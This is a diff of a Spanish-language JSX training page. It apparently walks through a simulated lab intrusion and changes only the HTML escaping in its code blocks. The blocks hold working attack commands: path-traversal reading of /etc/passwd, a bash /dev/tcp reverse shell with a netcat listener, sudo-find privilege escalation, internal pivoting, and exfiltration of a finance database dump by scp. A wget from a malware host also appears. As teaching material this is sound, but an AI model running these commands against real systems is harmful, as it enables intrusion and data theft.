@@ -405,10 +405,10 @@ wget http://malware-repo.bad/payload.sh</code></pre>
                 <pre><code>nmap -sV -p- WEB-DMZ-01{"\n"}dirb http://WEB-DMZ-01{"\n"}curl \"http://WEB-DMZ-01/view.php?file=../../../../etc/passwd\"</code></pre>
                 <h4>Fase 2: Acceso Inicial y Escalada</h4>
                 <p>La explotación web (simulada) te da ejecución de comandos como 'www-data'. Obtén una shell estable. (Simula una vulnerabilidad de 'sudo' mal configurada).</p>
-                <pre><code># En tu máquina (Listener):{"\n"}nc -lvnp 4444{"\n\n"}# En la víctima (via exploit web simulado):{"\n"}bash -c 'bash -i >& /dev/tcp/[TU_IP]/4444 0>&1'{"\n\n"}# Ya dentro de la shell inversa (como www-data):{"\n"}python3 -c 'import pty; pty.spawn(\"/bin/bash\")' # Estabilizar Shell{"\n"}sudo -l{"\n"}sudo /usr/bin/find . -exec /bin/sh \\; -quit # Escalada de privilegios</code></pre>
+                <pre><code># En tu máquina (Listener):{"\n"}nc -lvnp 4444{"\n\n"}# En la víctima (via exploit web simulado):{"\n"}bash -c 'bash -i &gt;&amp; /dev/tcp/[TU_IP]/4444 0&gt;&amp;1'{"\n\n"}# Ya dentro de la shell inversa (como www-data):{"\n"}python3 -c 'import pty; pty.spawn(\"/bin/bash\")' # Estabilizar Shell{"\n"}sudo -l{"\n"}sudo /usr/bin/find . -exec /bin/sh \\; -quit # Escalada de privilegios</code></pre>
                 <h4>Fase 3: Pivoteo y Exfiltración de Datos</h4>
                 <p>Ahora eres 'root' en 'WEB-DMZ-01'. Usa el servidor como plataforma de salto.</p>
-                <pre><code>ifconfig # Descubrir la red interna en eth1{"\n"}nmap -sT 10.10.0.0/24 # Escanear la red interna (Pivoteo){"\n\n"}# Objetivo encontrado: 10.10.0.50{"\n"}ssh root@10.10.0.50 \"cat /db/finance_backup.sql\" > backup.sql{"\n\n"}# Exfiltración (sacar los datos){"\n"}tar -czf loot.tar.gz backup.sql{"\n"}scp loot.tar.gz pasante-red@soc-valtorix:~</code></pre>
+                <pre><code>ifconfig # Descubrir la red interna en eth1{"\n"}nmap -sT 10.10.0.0/24 # Escanear la red interna (Pivoteo){"\n\n"}# Objetivo encontrado: 10.10.0.50{"\n"}ssh root@10.10.0.50 \"cat /db/finance_backup.sql\" &gt; backup.sql{"\n\n"}# Exfiltración (sacar los datos){"\n"}tar -czf loot.tar.gz backup.sql{"\n"}scp loot.tar.gz pasante-red@soc-valtorix:~</code></pre>
             </CisoCard>
             <CisoCard icon="brain-circuit" title="Puntos de Pensamiento Crítico">
                 <ul>
